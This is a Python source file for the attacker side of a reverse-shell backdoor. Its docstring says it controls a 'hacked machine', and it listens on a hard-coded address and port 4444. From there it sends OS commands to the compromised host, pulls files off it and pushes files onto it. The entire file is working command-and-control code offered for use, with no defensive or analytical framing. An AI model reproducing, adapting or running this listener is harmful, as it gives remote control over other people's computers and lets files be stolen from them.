#!/usr/bin/python

"""
Run in Python3
This is tcp/ip socket listener on given port and ip address
It can send OS commands to the hacked machine
It can download files from hacked machine with command: <download filename>
It can upload files to hacked machine with command: <upload filename>
Command <exit> stops the application and break the tcp/ip socket connection
"""

import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # option for reusing sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # listening for incoming connection on local port 4444
        listener.bind((ip, port))
        listener.listen(0)
        print(" Waiting for connection")
        self.connection, address = listener.accept()
        print(" Got connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        #self.connection.send(command.encode())
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()

        #return self.connection.recv(1024)
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return " Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode())

                result = self.execute_remotely(command)

                if command[0] == "download" and "Error" not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = " Error during command execution"

            print(result)


my_listener = Listener("192.168.1.132", 4444)
my_listener.run()

